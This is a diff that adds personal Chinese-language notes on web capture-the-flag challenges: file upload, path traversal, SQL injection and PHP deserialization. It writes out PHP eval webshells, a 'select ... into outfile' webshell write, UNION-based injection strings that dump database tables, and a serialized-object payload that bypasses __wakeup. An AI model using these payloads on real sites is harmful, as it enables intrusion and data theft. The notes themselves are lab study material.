@@ -64,5 +64,51 @@ echo(serialize($test));       //输出被序列化的对象（test）
 thinkphp漏洞*
 5.php的文件包含类型
 审计php代码,while函数根据page参数来判断php文件是否存在，如果存在此文件，则进行文件包含。
-默认页面为http://127.0.0.1/index.php,设置为page值，可确保while为真
-利用hello参数将执行内容显示，flag如图所示
+御剑扫描进入sql注入区域编辑一句话木马select "<?php eval($_POST[aaaa]);?>"  into ourfile '/tmp/yihua.php' 
+打开中国蚁剑输入url和密码发现flag
+2026.1.10
+1.upload
+浏览器绕过验证，一句话木马脚本php:<?php@eval($_POST['chopper']);?>
+bp抓包后修改jpg后缀改为php
+链接菜刀输入url地址找到flag
+2.warmup
+一张图片打开f12发现<!--source.php-->，访问source.php,发现需要访问hint.php
+访问后出现提示flag not here, and flag in ffffllllaaaagggg
+构造payload满足代码条件即file=hint.php
+访问上一个文件目录，直到找到ffffllllaaaagggg（五个if回退6次）
+执行查看文件ffffllllaaaagggg的命令找到flag
+3.sql注入
+猜字段1' union select 1,2,3# 
+爆破数据库名1' union select 1,database(),3# 返回3
+爆破表名1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="news"# 
+爆破列名1' union select 1, group_concat(column_name),3 from information_schema.columns where table_name="secret_table" # 
+出现flag提示  读取数据1' union select 1,fl4g,3 from secret_table# 
+4.php反序列化
+魔术方法_wakeup()  使用unserialize()函数反序列化一个对象
+构造payload注意base64解码  绕过wakeup
+<?php 
+class Demo {  
+    private $file = 'index.php'; 
+    public function __construct($file) {  
+        $this->file = $file;  
+    } 
+    function __destruct() {  
+        echo @highlight_file($this->file, true);  
+    } 
+    function __wakeup() {  
+        if ($this->file != 'index.php') {  
+            //the secret is in the fl4g.php 
+            $this->file = 'index.php';  
+        }  
+    }  
+} 
+$flag = new Demo('fl4g.php'); 
+$flag = serialize($flag); 
+$flag = str_replace('O:4', 'O:+4',$flag); // 绕过正则 
+$flag = str_replace(':1:', ':2:' ,$flag);  //绕过wakeup
+echo base64_encode($flag);   //对参数进行base编码 
+?>
+传递var参数
+5.inget（sql注入）
+构造payload 
+先尝试万能密码id=' or ''='直接给了flag
